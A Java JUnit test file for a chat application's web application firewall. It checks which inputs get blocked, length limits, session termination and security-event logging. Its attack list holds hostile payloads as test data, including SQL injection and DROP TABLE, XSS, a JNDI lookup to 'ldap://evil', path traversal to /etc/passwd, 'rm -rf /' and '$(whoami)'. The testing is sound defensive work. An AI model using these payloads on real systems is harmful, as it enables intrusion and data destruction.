package org.unibl.etfbl.ChatRoom.security.waf;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.test.util.ReflectionTestUtils;
import org.unibl.etfbl.ChatRoom.exceptions.NotFoundException;
import org.unibl.etfbl.ChatRoom.security.siem.SecurityEvent;
import org.unibl.etfbl.ChatRoom.security.siem.SecurityEventService;
import org.unibl.etfbl.ChatRoom.services.UserService;

import java.util.List;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.params.provider.Arguments.arguments;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

class WAFTest {

    private WAF waf;
    private UserService userService;
    private SecurityEventService securityEvents;

    @BeforeEach
    void setUp() {
        waf = new WAF();
        userService = mock(UserService.class);
        securityEvents = mock(SecurityEventService.class);
        ReflectionTestUtils.setField(waf, "userService", userService);
        ReflectionTestUtils.setField(waf, "securityEvents", securityEvents);
        ReflectionTestUtils.setField(waf, "paramName", "text");
    }

    @AfterEach
    void clearSecurityContext() {
        SecurityContextHolder.clearContext();
    }

    private static void signIn(String username) {
        SecurityContextHolder.getContext().setAuthentication(
                new UsernamePasswordAuthenticationToken(username, null, List.of()));
    }

    static Stream<Arguments> attacks() {
        return Stream.of(
                arguments("1' OR 1=1 --", WafRule.SQL_TAUTOLOGY),
                arguments("admin' or 'a'='a", WafRule.SQL_TAUTOLOGY),
                arguments("x UNION SELECT password FROM user", WafRule.SQL_UNION_SELECT),
                arguments("1; DROP TABLE comment", WafRule.SQL_STACKED_QUERY),
                arguments("DROP TABLE user", WafRule.SQL_DDL),
                arguments("delete from comment", WafRule.SQL_DML),
                arguments("admin'--", WafRule.SQL_COMMENT_AFTER_QUOTE),
                arguments("1 AND sleep(5)", WafRule.SQL_TIME_BASED),
                arguments("<script>alert(1)</script>", WafRule.HTML_TAG),
                arguments("<img src=x onerror=steal()>", WafRule.HTML_TAG),
                arguments("<b>bold</b>", WafRule.HTML_TAG),
                arguments("x onmouseover=steal()", WafRule.EVENT_HANDLER),
                arguments("javascript:alert(1)", WafRule.SCRIPT_URL),
                arguments("fetch(document.cookie)", WafRule.JS_SINK),
                arguments("${jndi:ldap://evil}", WafRule.TEMPLATE_EXPRESSION),
                arguments("{{7*7}}", WafRule.TEMPLATE_EXPRESSION),
                arguments("Runtime.getRuntime()", WafRule.JAVA_REFLECTION),
                arguments("../../etc/passwd", WafRule.PATH_TRAVERSAL),
                arguments("visit http://evil.example", WafRule.URL),
                arguments("a; rm -rf /", WafRule.COMMAND_INJECTION),
                arguments("$(whoami)", WafRule.COMMAND_INJECTION),
                arguments("*)(uid=*))(|(uid=*", WafRule.LDAP_INJECTION),
                arguments("<!DOCTYPE x [<!ENTITY e SYSTEM 'f'>]>", WafRule.XML_ENTITY),
                arguments("anonymousUser", WafRule.RESERVED_NAME)
        );
    }

    @ParameterizedTest(name = "{1} blocks: {0}")
    @MethodSource("attacks")
    void attackPatternsAreBlocked(String payload, WafRule expected) {
        assertThat(waf.findViolation(payload)).contains(expected);
    }

    @Test
    void headerInjectionNeedsALineBreak() {
        assertThat(waf.findViolation("hi\r\nBcc: everyone@example.com")).contains(WafRule.MAIL_HEADER_INJECTION);
        assertThat(waf.containsBannedWord("Note to: the moderators")).isFalse();
    }

    @Test
    void xmlEntitiesAreBlocked() {
        assertThat(WafRule.XML_ENTITY.matches("<!ENTITY e SYSTEM 'file'>")).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Great concert last night",
            "Rock and roll or jazz?",
            "Please update the schedule and delete the old one",
            "Select your favourite band",
            "I <3 music",
            "Is 2 < 3 and 5 > 4?",
            "Who won the match yesterday?",
            "Zdravo svima, kako ste?",
            "Price: 5 $ (or less)",
            "Wait... what?",
            "The onion soup = delicious",
    })
    void ordinaryTextIsAllowed(String text) {
        assertThat(waf.findViolation(text)).isEmpty();
    }

    @Test
    void rulesIgnoreCase() {
        assertThat(waf.findViolation("UnIoN SeLeCt 1")).contains(WafRule.SQL_UNION_SELECT);
    }

    @Test
    void lengthUpToTheColumnSizeIsAccepted() {
        assertThat(waf.checkingLength("text", "a".repeat(100))).isTrue();
        assertThat(waf.checkingLength("Username", "a".repeat(45))).isTrue();
    }

    @Test
    void lengthOverTheColumnSizeIsRejected() {
        assertThat(waf.checkingLength("text", "a".repeat(101))).isFalse();
        assertThat(waf.checkingLength("username", "a".repeat(46))).isFalse();
    }

    @Test
    void parameterWithoutALimitAlwaysFits() {
        assertThat(waf.checkingLength("unknown", "a".repeat(1000))).isTrue();
    }

    @Test
    void nullValueIsValid() {
        assertThat(waf.isValid(null, null)).isTrue();
    }

    @Test
    void validInputLeavesTheSessionAlone() {
        signIn("ana");

        assertThat(waf.isValid("Hello everyone", null)).isTrue();
        verifyNoInteractions(userService, securityEvents);
    }

    @Test
    void attackFromSignedInUserEndsTheirSession() {
        signIn("ana");

        assertThat(waf.isValid("1; DROP TABLE comment", null)).isFalse();
        verify(userService).deleteJWT("ana");
        verify(securityEvents).record(eq(SecurityEvent.WAF_BLOCKED), eq("ana"), contains("SQL_STACKED_QUERY"));
    }

    @Test
    void tooLongInputFromSignedInUserEndsTheirSession() {
        signIn("ana");

        assertThat(waf.isValid("a".repeat(150), null)).isFalse();
        verify(userService).deleteJWT("ana");
    }

    @Test
    void attackWithoutASessionIsStillRejected() {
        assertThat(waf.isValid("<script>x</script>", null)).isFalse();
        verifyNoInteractions(userService);
        verify(securityEvents).record(eq(SecurityEvent.WAF_BLOCKED), isNull(), contains("HTML_TAG"));
    }

    @Test
    void loggedInputCannotForgeLogLines() {
        waf.isValid("<b>x</b>\nFAKE EVENT", null);

        verify(securityEvents).record(eq(SecurityEvent.WAF_BLOCKED), isNull(), argThat(detail -> !detail.contains("\n")));
    }

    @Test
    void anonymousAuthenticationIsNotASession() {
        SecurityContextHolder.getContext().setAuthentication(new AnonymousAuthenticationToken(
                "key", "anonymousUser", AuthorityUtils.createAuthorityList("ROLE_ANONYMOUS")));

        assertThat(waf.isValid("<script>x</script>", null)).isFalse();
        verifyNoInteractions(userService);
    }

    @Test
    void deletedAccountDoesNotBreakValidation() {
        signIn("ghost");
        doThrow(new NotFoundException("gone")).when(userService).deleteJWT("ghost");

        assertThat(waf.isValid("<script>x</script>", null)).isFalse();
    }
}
